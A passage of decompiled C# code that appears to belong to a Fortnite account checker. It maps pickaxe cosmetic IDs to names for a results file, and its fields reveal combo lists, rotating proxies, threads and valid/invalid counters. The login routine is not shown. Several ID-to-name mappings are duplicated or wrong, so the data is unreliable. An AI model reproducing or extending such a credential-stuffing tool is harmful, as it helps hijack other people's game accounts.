                            sw.WriteLine("=> Default Pickaxe");
                        }
                        bool flag118 = x.Contains("AthenaPickaxe:pickaxe_id_054_filmcamera");
                        if (flag118)
                        {
                            sw.WriteLine("=> Director's Cut");
                        }
                        bool flag119 = x.Contains("AthenaPickaxe:pickaxe_id_016_disco");
                        if (flag119)
                        {
                            sw.WriteLine("=> Disco Brawl");
                        }
                        bool flag120 = x.Contains("AthenaPickaxe:pickaxe_id_025_dragon");
                        if (flag120)
                        {
                            sw.WriteLine("=> Dragon Axe");
                        }
                        bool flag121 = x.Contains("AthenaPickaxe:pickaxe_id_062_soccer");
                        if (flag121)
                        {
                            sw.WriteLine("=> Elite Cleat");
                        }
                        bool flag122 = x.Contains("AthenaPickaxe:pickaxe_id_028_space");
                        if (flag122)
                        {
                            sw.WriteLine("=> EVA");
                        }
                        bool flag123 = x.Contains("AthenaPickaxe:pickaxe_id_045_valor");
                        if (flag123)
                        {
                            sw.WriteLine("=> Gale Force");
                        }
                        bool flag124 = x.Contains("AthenaPickaxe:pickaxe_id_051_neonglow");
                        if (flag124)
                        {
                            sw.WriteLine("=> Glow Stick");
                        }
                        bool flag125 = x.Contains("AthenaPickaxe:pickaxe_id_014_wintercamo");
                        if (flag125)
                        {
                            sw.WriteLine("=> Ice breaker");
                        }
                        bool flag126 = x.Contains("AthenaPickaxe:pickaxe_id_039_tacticalblack");
                        if (flag126)
                        {
                            sw.WriteLine("=> Instigator");
                        }
                        bool flag127 = x.Contains("AthenaPickaxe:pickaxe_id_046_candy");
                        if (flag127)
                        {
                            sw.WriteLine("=> Lollipopper");
                        }
                        bool flag128 = x.Contains("AthenaPickaxe:pickaxe_id_064_gumshoe");
                        if (flag128)
                        {
                            sw.WriteLine("=> Magnifying Axe");
                        }
                        bool flag129 = x.Contains("AthenaPickaxe:pickaxe_id_048_carbideblack");
                        if (flag129)
                        {
                            sw.WriteLine("=> Onslaught");
                        }
                        bool flag130 = x.Contains("AthenaPickaxe:pickaxe_id_059_darkeagle");
                        if (flag130)
                        {
                            sw.WriteLine("=> Oracle Axe");
                        }
                        bool flag131 = x.Contains("AthenaPickaxe:pickaxe_id_029_assassin");
                        if (flag131)
                        {
                            sw.WriteLine("=> Party Animal");
                        }
                        bool flag132 = x.Contains("AthenaPickaxe:pickaxe_id_031_squeak");
                        if (flag132)
                        {
                            sw.WriteLine("=> Pick Squeak");
                        }
                        bool flag133 = x.Contains("AthenaPickaxe:pickaxe_flamingo");
                        if (flag133)
                        {
                            sw.WriteLine("=> Pink Flamingo");
                        }
                        bool flag134 = x.Contains("AthenaPickaxe:pickaxe_id_024_plunger");
                        if (flag134)
                        {
                            sw.WriteLine("=> Plunja");
                        }
                        bool flag135 = x.Contains("AthenaPickaxe:pickaxe_id_047_carbideblue");
                        if (flag135)
                        {
                            sw.WriteLine("=> Positron");
                        }
                        bool flag136 = x.Contains("AthenaPickaxe:pickaxe_id_061_wwiipilot");
                        if (flag136)
                        {
                            sw.WriteLine("=> Propeller Axe");
                        }
                        bool flag137 = x.Contains("AthenaPickaxe:pickaxe_id_012_district");
                        if (flag137)
                        {
                            sw.WriteLine("=> Pulse Axe");
                        }
                        bool flag138 = x.Contains("AthenaPickaxe:pickaxe_lockjaw");
                        if (flag138)
                        {
                            sw.WriteLine("=> Raider's Revenge");
                        }
                        bool flag139 = x.Contains("AthenaPickaxe:pickaxe_id_026_brite");
                        if (flag139)
                        {
                            sw.WriteLine("=> Rainbow Smash");
                        }
                        bool flag140 = x.Contains("AthenaPickaxe:halloweenscythe");
                        if (flag140)
                        {
                            sw.WriteLine("=> Scythe");
                        }
                        bool flag141 = x.Contains("AthenaPickaxe:pickaxe_id_050_graffiti");
                        if (flag141)
                        {
                            sw.WriteLine("=> Renegade Roller");
                        }
                        bool flag142 = x.Contains("AthenaPickaxe:pickaxe_id_027_scavenger");
                        if (flag142)
                        {
                            sw.WriteLine("=> Sawtooth");
                        }
                        bool flag143 = x.Contains("AthenaPickaxe:pickaxe_id_027_scavenger");
                        if (flag143)
                        {
                            sw.WriteLine("=> Ski Boot");
                        }
                        bool flag144 = x.Contains("AthenaPickaxe:pickaxe_id_027_scavenger");
                        if (flag144)
                        {
                            sw.WriteLine("=> Spectral Axe");
                        }
                        bool flag145 = x.Contains("AthenaPickaxe:pickaxe_id_037_stealth");
                        if (flag145)
                        {
                            sw.WriteLine("=> Spectre");
                        }
                        bool flag146 = x.Contains("AthenaPickaxe:pickaxe_id_044_tacticalurbanhammer");
                        if (flag146)
                        {
                            sw.WriteLine("=> Tenderizer");
                        }
                        bool flag147 = x.Contains("AthenaPickaxe:pickaxe_id_029_assassin");
                        if (flag147)
                        {
                            sw.WriteLine("=> Trusty No. 2");
                        }
                        bool flag148 = x.Contains("AthenaPickaxe:pickaxe_id_063_vuvuzela");
                        if (flag148)
                        {
                            sw.WriteLine("=> Vuvuzela");
                        }
                        bool flag149 = x.Contains("AthenaPickaxe:pickaxe_id_022_holidaygiftwrap");
                        if (flag149)
                        {
                            sw.WriteLine("=> Here");
                        }
                        sw.WriteLine("--------------------------------------------------------");
                        sw.WriteLine(Environment.NewLine);
                    }
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private ToolTip tp1 = new ToolTip();

        private HashSet<string> Combo = new HashSet<string>();

        private string fileName;

        private string folder;

        private int index;

        private string myFile;

        private List<string> Proxies = new List<string>();

        private Random rnd = new Random();

        private string textfile;

        private List<Thread> tList = new List<Thread>();

        private object tLock = new object();

        private int validcnt;

        private int invalidcnt;

        private int errorcnt;

        private int checkedcnt;

        private object _lock = new object();
    }
}
//Roshly was the one and only to post this file on github so dont u dare try to dmca me n shit
